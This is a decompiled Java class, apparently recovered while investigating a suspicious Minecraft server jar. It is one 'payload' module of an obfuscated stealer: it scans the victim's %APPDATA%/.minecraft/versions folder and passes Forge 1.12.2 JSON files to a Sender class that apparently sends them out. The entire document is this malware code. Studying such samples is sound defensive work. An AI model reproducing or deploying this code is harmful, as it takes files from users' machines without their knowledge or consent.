/*    */ package idasido.adldaosd.wpiw.payload.impl;
/*    */ 
/*    */ import idasido.adldaosd.wpiw.payload.Payload;
/*    */ import idasido.adldaosd.wpiw.payload.Sender;
/*    */ import java.io.File;
/*    */ import java.util.Objects;
/*    */ 
/*    */ 
/*    */ 
/*    */ public final class JsonVersion
/*    */   implements Payload
/*    */ {
/*    */   public void execute() throws Exception {
/* 14 */     File file2 = new File(System.getenv("APPDATA") + "/.minecraft/versions");
/* 15 */     if (file2.isDirectory())
/* 16 */       for (File file1 : (File[])Objects.<File[]>requireNonNull(file2.listFiles())) {
/* 17 */         if (file1.isDirectory())
/* 18 */           for (File file : (File[])Objects.<File[]>requireNonNull(file1.listFiles())) {
/* 19 */             if (file.getName().contains(".json") && file.getName().contains("1.12.2") && file.getName().contains("forge"))
/* 20 */               Sender.send(file); 
/*    */           }  
/*    */       }  
/*    */   }
/*    */ }


/* Location:              C:\Users\aesthetical\Downloads\investagate\COPE-1.0-SNAPSHOT-server.jar!\idasido\adldaosd\wpiw\payload\impl\JsonVersion.class
 * Java compiler version: 8 (52.0)
 * JD-Core Version:       1.1.3
 */